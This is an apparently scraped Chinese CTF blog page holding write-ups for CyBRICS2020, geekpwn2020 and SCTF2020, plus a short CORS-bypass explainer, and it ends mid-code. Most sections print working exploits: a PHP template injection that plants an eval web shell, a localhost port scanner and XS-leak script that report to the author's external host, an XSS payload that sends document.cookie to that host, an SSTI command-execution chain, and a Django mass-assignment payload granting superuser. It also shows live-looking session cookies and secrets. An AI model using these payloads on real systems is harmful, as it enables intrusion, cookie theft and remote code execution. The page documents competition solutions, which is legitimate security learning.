<pre><code class="php=">        if (strpos($html, &#39;&lt;?&#39;) !== false) {
            $error = &quot;Bad chars&quot;;
            break;
        }
        ...
        file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html);</code></pre>
<p>calc.php</p>
<pre><code class="php=">file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));</code></pre>
<p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p>
<p>新建template:</p>
<pre><code>*/)).eval($_POST[1])?&gt;
$requiredBlocks = [
            &#39;id=&quot;back&quot;&#39;,
            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
            &#39;id=&quot;digit0&quot;&#39;,
            &#39;id=&quot;digit1&quot;&#39;,
            &#39;id=&quot;digit2&quot;&#39;,
            &#39;id=&quot;digit3&quot;&#39;,
            &#39;id=&quot;digit4&quot;&#39;,
            &#39;id=&quot;digit5&quot;&#39;,
            &#39;id=&quot;digit6&quot;&#39;,
            &#39;id=&quot;digit7&quot;&#39;,
            &#39;id=&quot;digit8&quot;&#39;,
            &#39;id=&quot;digit9&quot;&#39;,
            &#39;id=&quot;plus&quot;&#39;,
            &#39;id=&quot;equals&quot;&#39;,
        ];</code></pre><p>向calc post:<br><code>field=1/*&amp;share=1</code></p>
<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
<h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p>
<p>浏览器信息：HeadlessChrome/79.0.3945.79 </p>
<p>填写脚本：</p>
<pre><code class="javascript=">a=document.getElementsByClassName(&quot;form-control&quot;);a[1].value=&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;;a[0].value=&quot;http://ccreater.top:60000&quot;;</code></pre>
<p>返回包</p>
<pre><code>HEAD / HTTP/1.1
Host: ccreater.top:60000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Access-Control-Request-Method: POST
Origin: prod.free-design-feedback-cybrics2020.ctf.su
Referer: http://prod.free-design-feedback-cybrics2020.ctf.su
</code></pre><p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p>
<p>http服务扫描：</p>
<pre><code class="htmlmixed=">&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;script&gt;
var from = 1;
var complete = true;
var clear = false;
function check(text){
    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener(&#39;load&#39;, function () {
        console.log(text)
        // log
        fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)
            .then(r=&gt;r.text())
            .then(d=&gt;{console.log(&quot;log success&quot;)})
        // log end
    });
}
function clearstyle(clear_from ,clear_to){
    clear = true;
    console.log(&quot;clear task start&quot;);
    while(clear_to&lt;=clear_from){
            document.head.querySelector(&#39;link[href$=&quot;:&#39;+clear_to+&#39;&quot;&#39;).remove();
            clear_to++;
    }
    clear = false;
    console.log(&quot;clear task end&quot;);
}
function make(text){
    head = document.getElementsByTagName(&#39;head&#39;)[0];
    var port = text;
    var url = &quot;http://127.0.0.1:&quot;+port,
    link = document.createElement(&#39;link&#39;);
    link.rel = &quot;stylesheet&quot;;
    link.href = url;
    head.appendChild(link);
    check(text);
}
async function scan(){
    var to = from + 80 &gt; 65535 ? 65535 : from + 80;
    for(var i=from;i&lt;to;i++){
        make(String(i));
    }
    from +=80;
    setTimeout(()=&gt;{clearstyle(from,to);},5000);
};

async function listener (){
    console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);
    if(from &lt; 65535){
        setTimeout(listener,5000);
        if(complete &amp;&amp; !clear){
            console.log(&quot;new task!&quot;);
            scan()
                .then(()=&gt;{complete = true;})
            complete = false;
        }
    }

}
listener()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p>
<p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/29/CyBRICS2020/">http://blog.ccreater.top/2020/07/29/CyBRICS2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/29/CyBRICS2020/" data-id="ckd6wbuc50000x4v05bg26sz7" data-title="CyBRICS2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/19/geekpwn2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-19T13:55:23.978Z" itemprop="datePublished">2020-07-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="geekpwn-2020热身赛"><a href="#geekpwn-2020热身赛" class="headerlink" title="geekpwn 2020热身赛"></a>geekpwn 2020热身赛</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>直接用cos的api读取文件</p>
<pre><code class="javascript">cos.getBucket({
    Bucket: Bucket,
    Region: Region,
}, function(err, data) {
    console.log(err || data.Contents);
});


cos.getObject({
    Bucket: Bucket,
    Region: Region,
    Key: &#39;f1L9@/flag.txt&#39;,
}, function(err, data) {
    console.log(err || data.Body);
});
</code></pre>
<h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><pre><code class="python">from flask import Flask, request, jsonify, Response
from os import getenv

app = Flask(__name__)

DATASET = {
    114: &#39;514&#39;,
    810: &#39;8931919&#39;,
    2017: &#39;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#39;,
    2019: &#39;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#39;,
    2020: &#39;flag{2333333333}&#39;
}


@app.before_request
def check_host():
    pass


@app.route(&quot;/&quot;)
def index():
    return app.send_static_file(&#39;index.html&#39;)


@app.route(&quot;/search&quot;)
def search_handler():
    keyword = request.args.get(&#39;keyword&#39;)
    if keyword is None:
        return jsonify(DATASET)
    else:
        ret = {}
        for i in DATASET:
            if keyword in DATASET[i]:
                ret[i] = DATASET[i]
        return jsonify(ret), 200 if len(ret) else 404


@app.after_request
def add_security_headers(resp):
    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
    resp.headers[&#39;Content-Security-Policy&#39;] = &#39;default-src \&#39;self\&#39;; frame-src https://www.youtube.com&#39;
    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;
    return resp


if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=3000, )
</code></pre>
<p>我们注意到search是通过in来判断是否存在，并返回404或200</p>
<p>虽然<code>http://noxss2020.cal1.cn:3000/</code>有cors,但是我们并不需要他返回的内容，我们只需要状态码，这样就简单多了。我们将页面当成css来加载，通过是否加载成功来判断状态码</p>
<p>payload:</p>
<pre><code class="html">&lt;html&gt;
&lt;body&gt;

&lt;script&gt;
var guess=&quot;flag&quot;;
var ok=true;
function check(text){
    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener(&#39;load&#39;, function () {

        guess=unescape(text);
        console.log(guess)
        ok=true;
        if(guess.endsWith(&quot;}&quot;)){
            location=&quot;http://ccreater.top:60010/log.php?log=&quot;+guess;
        };
        var s = guess.substr(0,guess.length-1);
        while(tmp=document.head.querySelector(&#39;link[href*=&quot;&#39;+s+&#39;&quot;&#39;)){
            tmp.remove();
        }
        fuzz()
    });
}
function make(text){
    head = document.getElementsByTagName(&#39;head&#39;)[0];

    var url = &quot;http://127.0.0.1:3000/search?keyword=&quot;+escape(text),
    link = document.createElement(&#39;link&#39;);
    link.rel = &quot;stylesheet&quot;;
    link.href = url;
    head.appendChild(link);
    check(escape(text));
}

async function fuzz(){
    for(i of &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}&quot;){
        if(make(guess+i)){
            break;
        }
    }
    return true
}
function exploit(){
    fuzz()
}

fuzz()
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>阅读代码发现：</p>
<pre><code>function(e, t, r) {
        &quot;use strict&quot;;
        r.r(t);
        r(91);
        var n = {
            mounted: function() {
                window.addEventListener(&quot;message&quot;, (function(e) {
                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))
                        switch (e.data.action) {
                        case &quot;append&quot;:
                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);
                        case &quot;debug&quot;:
                            return void console.log(e.data.payload);
                        case &quot;ping&quot;:
                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)
                        }
                }
                ), !1),
                postMessage({
                    action: &quot;ping&quot;
                })
            }
        }</code></pre><p>那么我们可以在页面中嵌入iframe来postMessage,从而插入恶意内容，唯一的障碍是：<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p>
<p>因为match是一个正则匹配函数，所以构造<code>http://umsg_iffi_top.evildomain</code>来绕过</p>
<p>payload:</p>
<pre><code>&lt;html&gt;
&lt;body&gt;

&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;
&lt;/iframe&gt;
&lt;script&gt;
setTimeout(()=&gt;{
document.body.children[0].contentWindow.postMessage({action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#39;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#39;&gt;&quot;},&quot;http://umsg.iffi.top:3000/&quot;)
},5000);
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/19/geekpwn2020/">http://blog.ccreater.top/2020/07/19/geekpwn2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/19/geekpwn2020/" data-id="ckct57ifr00001gv03qlcd93o" data-title="geekpwn2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/09/bypass%20CORS/" class="article-date">
  <time class="dt-published" datetime="2020-07-09T13:42:48.661Z" itemprop="datePublished">2020-07-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/09/bypass%20CORS/">bypass CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>CORS: Cross Origin Resource Share,设置在服务端，客户端执行的一种策略。</p>
<blockquote>
<p>出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求或者 跨站请求可以正常发起，但是返回结果被浏览器拦截了 。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。 </p>
</blockquote>
<h2 id="相关的字段"><a href="#相关的字段" class="headerlink" title="相关的字段"></a>相关的字段</h2><p>响应：</p>
<pre><code>Access-Control-Allow-Origin
Access-Control-Expose-Headers
Access-Control-Max-Age
Access-Control-Allow-Credentials
Access-Control-Allow-Methods
Access-Control-Allow-Headers
</code></pre><p>请求：</p>
<pre><code>Origin
Access-Control-Request-Method
Access-Control-Request-Headers
</code></pre><h2 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h2><h3 id="根据某些字段来设置ACAO头"><a href="#根据某些字段来设置ACAO头" class="headerlink" title="根据某些字段来设置ACAO头"></a>根据某些字段来设置ACAO头</h3><pre><code>GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

根据Origin头来设置Access-Control-Allow-Origin

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true</code></pre><h3 id="对Origin头的错误解析"><a href="#对Origin头的错误解析" class="headerlink" title="对Origin头的错误解析"></a>对Origin头的错误解析</h3><p>因为要对子域名的支持，所以有些网站会这样写:</p>
<pre><code>if Origin.domain startwith &quot;domain.com&quot;:
    return &quot;Access-Control-Allow-Origin: &quot;+Origin
</code></pre><p>或者</p>
<pre><code>if Origin.domain endwith &quot;domain.com&quot;:
    return &quot;Access-Control-Allow-Origin: &quot;+Origin
</code></pre><p>像这种都很好绕过：</p>
<p>domain.com.evildomain.com 或者 evildomain-domain.com</p>
<h3 id="白名单中存在-null"><a href="#白名单中存在-null" class="headerlink" title="白名单中存在:null"></a>白名单中存在:null</h3><p> Origin支持值null，在某些情况下，浏览器可能会在Origin标头中发送值null：</p>
<ul>
<li><p>跨站点重定向</p>
</li>
<li><p>来自序列化数据的请求</p>
</li>
<li><p>使用<code>file</code>协议的请求</p>
</li>
<li><p>沙盒中的跨域请求</p>
</li>
</ul>
<h2 id="利用受信任的域"><a href="#利用受信任的域" class="headerlink" title="利用受信任的域"></a>利用受信任的域</h2><p>在受信任的域上找到xss，就可以绕过CORS</p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>23333</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">https://portswigger.net/web-security/cors</a> </p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/07/09/bypass">http://blog.ccreater.top/2020/07/09/bypass</a> CORS/](<a href="http://blog.ccreater.top/2020/07/09/bypass">http://blog.ccreater.top/2020/07/09/bypass</a> CORS/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/09/bypass%20CORS/" data-id="ckceucv7j0000d4v08qmmgco2" data-title="bypass CORS" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-sctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/07/sctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-07T07:19:44.928Z" itemprop="datePublished">2020-07-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/07/sctf2020/">sctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网：</p>
<pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])
def caculator():
    try:
        data = request.get_json()
    except ValueError:
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
    num1 = str(data[&quot;num1&quot;])
    num2 = str(data[&quot;num2&quot;])
    symbols = data[&quot;symbols&quot;]
    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})

    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre>
<p>可以进行符合条件的ssrf的只有</p>
<pre><code class="python">
def flask_rpc(request):
    if request.META[&#39;REMOTE_ADDR&#39;] != &quot;127.0.0.1&quot;:
        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})

    methods = request.GET.get(&quot;methods&quot;)
    url = request.GET.get(&quot;url&quot;)

    if methods == &quot;GET&quot;:
        return JsonResponse(
            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})
    elif methods == &quot;POST&quot;:
        data = base64.b64decode(request.GET.get(&quot;data&quot;))
        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,
                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,
                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})
    else:
        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})</code></pre>
<p>但是需要<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>，利用 CVE-2018-14574跳转到127.0.0.1:8000访问/rpc ，这样我们就能ssti，在这之前我们需要搞到Token</p>
<pre><code class="python">@login_required
def home(request):
    if request.method == &quot;GET&quot;:
        return render(request, &quot;templates/home.html&quot;)
    elif request.method == &quot;POST&quot;:
        white_list = [&quot;39.104.19.182&quot;]
        try:
            data = json.loads(request.body)
        except ValueError:
            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})

        if Token.objects.all().first().Token == data[&quot;token&quot;]:
            try:
                if ssrf_check(data[&quot;url&quot;], white_list):
                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})
                else:
                    res = requests.get(data[&quot;url&quot;], timeout=1)
            except Exception:
                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})
            if res.status_code == 200:
                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})
            else:
                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})
        else:
            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})</code></pre>
<pre><code class="python">def reg(request):
    if request.method == &quot;GET&quot;:
        return render(request, &quot;templates/reg.html&quot;)
    elif request.method == &quot;POST&quot;:
        try:
            data = json.loads(request.body)
        except ValueError:
            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})

        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:
            return JsonResponse({&quot;code&quot;: 1})
        User.objects.create_user(**data)
        return JsonResponse({&quot;code&quot;: 0})</code></pre>
<p>构造：<code>{&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true}</code></p>
<p>得到token:<code>3ad9af405504233188f694a11ff22115</code></p>
<p>接下来就是ssti了</p>
<pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])
def caculator():
    try:
        data = request.get_json()
    except ValueError:
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
    num1 = str(data[&quot;num1&quot;])
    num2 = str(data[&quot;num2&quot;])
    symbols = data[&quot;symbols&quot;]
    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})

    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre>
<p>最后的payload:</p>
<pre><code class="python">import requests
import base64
import json
num1=1
num2=2
symbols=&quot;-{{''.__class__.__mro__[1].__subclasses__()[409]('/readflag',shell=True,stdout=-1).communicate()}}-&quot;
data={
    &quot;num1&quot;:num1,
    &quot;num2&quot;:num2,
    &quot;symbols&quot;:symbols
}
payload=json.dumps(data).replace(&quot;{{","\\u007b\\u007b").replace("}}&quot;,&quot;\\u007d\\u007d&quot;)
payload=base64.b64encode(payload)
print(payload)
burp0_url = &quot;http://39.104.19.182:80/home/&quot;
burp0_cookies = {&quot;sessionid&quot;: &quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;, &quot;csrftoken&quot;: &quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;}
burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://39.104.19.182&quot;, &quot;Referer&quot;: &quot;http://39.104.19.182/home/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_json={&quot;token&quot;: &quot;3ad9af405504233188f694a11ff22115&quot;, &quot;url&quot;: &quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data={payload}&quot;.format(payload=payload)}
print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</code></pre>
<p><code>SCTF{2b19246757c63738e7c40bbdf87c3be1}</code></p>
<h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answer😀.</p>
<p>搜索 “空间站” “接收机” 信息 音频 等关键字找到<br><a href="https://zhuanlan.zhihu.com/p/98103018" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98103018</a><br><a href="https://www.sohu.com/a/159552694_610733" target="_blank" rel="noopener">https://www.sohu.com/a/159552694_610733</a><br>SSTV关键字</p>
<p><a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br><a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04" target="_blank" rel="noopener">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
<p>下载 mmsstv<br>修改录音设备为立体声混音<br>具体操作为：Option-&gt;Soundcard input level<br>播放音频得到flag:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p>
<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
<pre><code class="javascript=">HTTP/1.1 200 OK
Content-Disposition: attachment; filename=&quot;dc62d163f53ce13369ab97041706060c&quot;
Content-Length: 1547
Last-Modified: Sat, 04 Jul 2020 05:14:45 GMT
Cache-Control: max-age=0
Content-Type: application/octet-stream
Date: Sat, 04 Jul 2020 05:14:50 GMT
Connection: close

const fs = require(&#39;fs&#39;);
const path = require(&#39;path&#39;);
const crypto = require(&#39;crypto&#39;);
const Koa = require(&#39;koa&#39;);
const Router = require(&#39;koa-router&#39;);
const koaBody = require(&#39;koa-body&#39;);
const send = require(&#39;koa-send&#39;);

const app = new Koa();
const router = new Router();
const SECRET = &quot;03229a6694e657077f218c322f3e0bea&quot;


app.use(koaBody({
  multipart: true,
  formidable: {
      maxFileSize: 2000 * 1024 * 1024 
  }
}));


router.post(&#39;/uploadfile&#39;, async (ctx, next) =&gt; {
  const file = ctx.request.body.files.file;
  if (!fs.existsSync(file.path)) {
    return ctx.body = &quot;Error&quot;;
  }
  if(file.path.toString().search(&quot;/fd/&quot;) != -1){
    file.path=&quot;/dev/null&quot;
  }
  const reader = fs.createReadStream(file.path);
  let fileId = crypto.createHash(&#39;md5&#39;).update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);
  let filePath = path.join(__dirname, &#39;upload/&#39;) + fileId
  const upStream = fs.createWriteStream(filePath);
  reader.pipe(upStream)
  return ctx.body = &quot;Upload success ~, your fileId is hereï¼&quot; + fileId;
});


router.get(&#39;/downloadfile/:fileId&#39;, async (ctx, next) =&gt; {
  let fileId = ctx.params.fileId;
  ctx.attachment(fileId);
  try {
    await send(ctx, fileId, { root: __dirname + &#39;/upload&#39; });
  }catch(e){
    return ctx.body = &quot;SCTF{no_such_file_~}&quot;
  }
});


router.get(&#39;/&#39;, async (ctx, next) =&gt; {
  ctx.response.type = &#39;html&#39;;
  ctx.response.body = fs.createReadStream(&#39;index.html&#39;);

});

app.use(router.routes());
app.listen(3333, () =&gt; {
  console.log(&#39;This server is running at http://localhost:&#39; + 3333)
})
</code></pre>
<p>因为koa中访问参数也是ctx.request.body.xxxx 所以我们可以构造</p>
<pre><code>POST /uploadfile HTTP/1.1
Host: 127.0.0.1:3333
Content-Length: 77
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:3333
Referer: http://127.0.0.1:3333/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{&quot;files&quot;:{&quot;file&quot;:{&quot;path&quot;:&quot;flag&quot;}}}</code></pre><p>来进行任意文件读取</p>
<p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p>
<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><pre><code class="php=">
Route::get(&#39;/&#39;,&quot;IndexController@init&quot;);
Route::post(&#39;/rm&#39;,&quot;IndexController@rm&quot;);
Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {
    readfile(&quot;./var/tmp/&quot;.$filename);
})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);
Route::post(&#39;/upload&#39;,&quot;IndexController@upload&quot;);
Route::get(&#39;/move/log/{filename}&#39;, &#39;IndexController@moveLog&#39;)-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);
</code></pre>
<pre><code class="php=">&lt;?php


namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function init(){
